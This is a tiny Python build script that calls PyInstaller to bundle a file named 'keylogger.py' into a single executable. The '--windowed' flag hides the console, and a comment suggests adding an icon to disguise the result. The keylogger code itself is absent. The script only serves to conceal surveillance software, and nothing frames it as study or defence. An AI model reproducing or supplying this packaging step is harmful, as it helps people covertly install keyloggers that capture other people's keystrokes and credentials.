import PyInstaller.__main__

PyInstaller.__main__.run([
    'keylogger.py',
    '--onefile',
    '--windowed',
    '--icon=icon.ico'  # Optional: add an icon to disguise the executable
])
